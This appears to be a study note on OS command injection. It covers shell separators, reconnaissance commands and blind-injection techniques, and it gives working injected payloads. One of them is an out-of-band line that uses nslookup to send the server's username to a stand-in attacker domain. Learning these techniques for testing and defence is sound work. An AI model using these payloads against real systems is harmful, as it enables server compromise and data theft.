# OS Command Injection
#Injection #OAST

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to **execute** arbitrary operating system (OS) **commands** on the server that is running an application, and typically **fully compromise** the application and all its data. Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, **exploiting** trust relationships to **pivot** the attack to other systems within the organization.

## Executing Arbitrary Commands
A **command separators** can be used to **chain** commands within the command line. Therefore, if an input is not **sanitised**, commands can be **executed** on the server.

Placing an additional **command separator** after the injected command is generally useful because it separates the injected command from whatever **follows** the injection point. This reduces the likelihood that what follows will **prevent** the injected command from executing.

### Command Separators
A variety of shell **metacharacters** can be used to perform OS command injection attacks.
|Metacharacter|Operating System|
|---|---|
|`&`|Unix/Windows|
|`&&`|Unix/Windows|
|<code>&#124;</code>|Unix/Windows|
|<code>&#124;&#124;</code>|Unix/Windows|
|`;`|Unix|
|`\n` or `0x0a`|Unix|
|<code>&#96;*command*&#96;</code>|Unix|
|<code>$(*command*)</code>|Unix|

## Useful Commands
|Function|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|

## Blind Attacks
Many instances of OS command injection are **blind** vulnerabilities. This means that the application **does not** return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

### Detecting Blind OS Command Injection
Blind command injection can be detected by triggering a **time delay**. The easiest way to do this is by using `ping`. The following command will cause the application to ping the loopback address for **10 seconds**: 
`& ping -c 10 127.0.0.1 &`

### Blind OS Command Injection With Redirected Output
You can **redirect** the output from the injected command into a **file** within the **web root** that you can then retrieve using the browser. For example, if the application serves **static** resources from the filesystem location `/var/www/static`, then you can submit the following input:
`& whoami > /var/www/static/whoami.txt &`

### Out-Of-Band (OAST) Blind OS Command Injection
You can use an injected command that will trigger an **out-of-band network interaction** with a system that you control, using OAST techniques. For example:
``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``
